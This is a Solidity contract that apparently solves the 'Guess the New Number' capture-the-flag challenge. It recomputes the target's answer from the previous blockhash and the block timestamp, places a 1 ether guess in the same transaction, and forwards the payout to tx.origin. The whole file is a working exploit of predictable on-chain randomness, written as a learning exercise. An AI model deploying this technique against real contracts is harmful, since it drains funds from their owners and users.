pragma solidity 0.8.7;

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8) external payable; 
}

contract GuessTheNewNumberChallengeHack {
    IGuessTheNewNumberChallenge public gtnInstance;
    uint8 public answer;

    constructor (address _gtnInstance) {
        gtnInstance = IGuessTheNewNumberChallenge(_gtnInstance);
    }

    receive() external payable {}

    function attack() public payable {
        require(msg.value == 1 ether);
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        gtnInstance.guess{value: msg.value}(answer);
        
        require(gtnInstance.isComplete(), "Attack is not complete");
        payable(tx.origin).transfer(address(this).balance);
    }

}